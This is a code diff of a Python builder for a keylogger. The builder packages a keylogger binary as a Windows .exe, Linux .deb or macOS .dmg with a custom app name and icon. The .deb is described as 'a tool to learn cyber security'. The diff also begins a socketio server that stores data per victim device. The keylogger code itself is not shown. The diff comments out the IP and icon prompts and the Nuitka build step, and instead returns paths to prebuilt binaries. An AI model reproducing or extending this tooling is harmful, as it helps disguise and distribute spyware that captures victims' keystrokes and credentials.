@@ -16,7 +16,7 @@ def get_os_type():
             return os_type
         else:
             console.print("[bold red]❌ Invalid OS type. Please enter 'win', 'linux', or 'mac'.[/bold red]")
-
+''' depricated due to build failure
 def get_server_ip():
     while True:
         ip = input("2 🌐 Enter server IP address (e.g. 192.168.1.1): ").strip()
@@ -47,19 +47,22 @@ def get_icon_url():
             return url
         else:
             console.print("[bold red]❌ Invalid URL. Please start with http:// or https://[/bold red]")
-
+'''
 
 def input_instructions():
     console.print(Panel.fit(
         "[bold yellow]Instructions[/bold yellow]\n\n"
-        "🖥️  [bold]Step 1:[/bold] Choose OS type → [green]win[/green], [green]linux[/green], or [green]mac[/green]\n"
-        "🌐 [bold]Step 2:[/bold] Enter server IP address (e.g. 192.168.1.1)\n"
-        "🏷️  [bold]Step 3:[/bold] Enter your desired app name (e.g. MyApp)\n"
-        "🖼️  [bold]Step 4:[/bold] Enter icon image URL (e.g. https://example.com/icon.png)\n"
-        "⚠️  [bold]Warning:[/bold] Windows use .ico (e.g. logo.ico) for other OS use .png (e.g. logo.png)\n\n"
+        "🖥️  [bold]Step :[/bold] Choose OS type → [green]win[/green], [green]linux[/green], or [green]mac[/green]\n\n"
         "❌ Enter [red]'x'[/red] to exit anytime",
         border_style="magenta"
     ))
+
+    '''
+       "🌐 [bold]Step 2:[/bold] Enter server IP address (e.g. 192.168.1.1)\n"
+        "🏷️  [bold]Step 3:[/bold] Enter your desired app name (e.g. MyApp)\n"
+        "🖼️  [bold]Step 4:[/bold] Enter icon image URL (e.g. https://example.com/icon.png)\n"
+        "⚠️  [bold]Warning:[/bold] Windows use .ico (e.g. logo.ico) for other OS use .png (e.g. logo.png)\n\n"
+        '''
 
 def user_option():
     console.print(Panel.fit(
@@ -91,7 +94,8 @@ def getio():
     os_type = get_os_type()
     if os_type == "exit":
         return None
-
+    return os_type
+''' depricated due to build failure
     ip_address = get_server_ip()
     if ip_address == "exit":
         return None
@@ -106,9 +110,9 @@ def getio():
 
     return os_type, ip_address, app_name, icon_url
 
-
-
-
+'''
+    
+''' depricated due to build failure
 def download_icon(icon_url, app_name):
     ext = '.ico' if icon_url.endswith('.ico') else '.png'
     local_path = f'{app_name}_icon{ext}'
@@ -125,8 +129,10 @@ def download_icon(icon_url, app_name):
     except Exception as e:
         console.print(f"[red]❌ Error downloading icon: {e}[/red]")
         return None
+'''
 
-def compile_app(os_type, ip_address, app_name, icon_url):
+def compile_app(os_type):
+    ''' depricated due to build failure
     # 1. Inject app name into code.py
     code_path = 'keylogger/keylogger.py'
     with open(code_path, 'r') as f:
@@ -141,67 +147,81 @@ def compile_app(os_type, ip_address, app_name, icon_url):
             )
     with open(code_path, 'w') as f:
         f.writelines(lines)
-    print(code_path,ip_address,lines)
+  
     # 2. Download icon file from URL
     icon_path = download_icon(icon_url, app_name)
     if not icon_path:
         return
-    input()
+   
     # 3. Build with PyInstaller
     build_dir = 'keylogger/build'
+    output_file = os.path.join(build_dir, app_name)
+    installer_output = os.path.join(build_dir, f"{app_name}_installer")
+    temp_build_dir = os.path.join(build_dir, 'temp')
     os.makedirs(build_dir, exist_ok=True)
+    os.makedirs(temp_build_dir, exist_ok=True)
 
     # 1. Build executable
-    build_cmd = f'pyinstaller --onefile --name "{app_name}" "{code_path}"'
+    if os_type == 'win':
+        build_cmd = f'nuitka --mingw64 --standalone --onefile --output-dir={build_dir} --output-filename={app_name} {code_path}'
+    else:
+        build_cmd = f'nuitka --standalone --onefile --output-dir={build_dir} --output-filename={app_name} {code_path}'
 
-    if os_type == 'win' and icon_path.endswith('.ico'):
-        build_cmd += f' --icon="{icon_path}"'
-    elif os_type in ['linux', 'mac'] and icon_path.endswith('.png'):
-        build_cmd += f' --icon="{icon_path}"'
+   # os.system(build_cmd)
+    input()
 
-    build_cmd += f' --distpath={build_dir}'
-
-    console.print("\n🔧 [yellow]Building the executable with PyInstaller...[/yellow]")
-    os.system(build_cmd)
-
-    # 2. Define paths
-    output_file = f'{build_dir}/{app_name}'
-    installer_output = f'{build_dir}/{app_name}_installer'
-
-    # 3. OS-specific packaging
+    # OS-Specific Packaging
     if os_type == 'win':
         console.print(f"✅ [green]EXE created:[/green] {output_file}.exe")
 
     elif os_type == 'linux':
         console.print("📦 [cyan]Packaging into .deb...[/cyan]")
-        os.makedirs(f'{installer_output}/DEBIAN', exist_ok=True)
-        os.makedirs(f'{installer_output}/usr/local/bin', exist_ok=True)
+        os.makedirs(os.path.join(installer_output, 'DEBIAN'), exist_ok=True)
+        os.makedirs(os.path.join(installer_output, 'usr/local/bin'), exist_ok=True)
+        app_name_clean = app_name.lower().replace('_', '-')
 
-        control_content = f"""Package: {app_name}
-    Version: 1.0
-    Section: base
-    Priority: optional
-    Architecture: all
-    Maintainer: karthithehacker
-    Description: a tool to learn cyber security
-    """
-        with open(f'{installer_output}/DEBIAN/control', 'w') as f:
+        control_content = f"""Package: {app_name_clean}
+Version: 1.0
+Section: base
+Priority: optional
+Architecture: all
+Maintainer: karthithehacker
+Description: a tool to learn cyber security
+
+"""
+
+        with open(os.path.join(installer_output, 'DEBIAN', 'control'), 'w') as f:
             f.write(control_content)
 
-        shutil.copy(f'{output_file}', f'{installer_output}/usr/local/bin/{app_name}')
+        shutil.copy(f"{output_file}.bin", os.path.join(installer_output, 'usr/local/bin', app_name_clean))
         os.system(f'dpkg-deb --build {installer_output}')
-        shutil.move(f'{installer_output}.deb', f'{build_dir}/{app_name}.deb')
-        console.print(f"✅ [green].deb file created:[/green] {build_dir}/{app_name}.deb")
+        shutil.move(f'{installer_output}.deb', os.path.join(build_dir, f'{app_name_clean}.deb'))
+        console.print(f"✅ [green].deb file created:[/green] {build_dir}/{app_name_clean}.deb")
 
     elif os_type == 'mac':
         console.print("🍏 [cyan]Creating .dmg (macOS)...[/cyan]")
-        shutil.move(f'{output_file}', f'{build_dir}/{app_name}')
+        shutil.move(f"{output_file}.bin", os.path.join(build_dir, app_name))
         os.system(f'create-dmg {build_dir}/{app_name}.dmg {build_dir}/{app_name}')
         console.print(f"✅ [green].dmg created:[/green] {build_dir}/{app_name}.dmg")
 
-        
+    try:
+        if icon_path and os.path.exists(icon_path):
+            os.remove(icon_path)
+    except:
+        pass
+'''
+    if os_type == "mac":
+        file_ext = f"{os.getcwd()}/keylogger/build/keylogger_mac.dmg"
+    elif os_type == "linux":
+        file_ext = f"{os.getcwd()}/keylogger/build/keylogger_linux"
+    elif os_type == "win":
+        file_ext = f"{os.getcwd()}/keylogger/build/keylogger_win.exe"
     else:
-        console.print("❌ [red]Unknown OS type specified.[/red]")
+        raise ValueError("Unsupported OS type")
+
+    return file_ext
+
+
 
 
 def start_keylogger_server():
@@ -215,7 +235,6 @@ def start_keylogger_server():
     sio = socketio.Server()
     app = socketio.WSGIApp(sio)
     clients = {}
-
     # Create folders
     base_dir = os.path.join(os.getcwd(), "keylogger")
     devices_dir = os.path.join(base_dir, "devices")
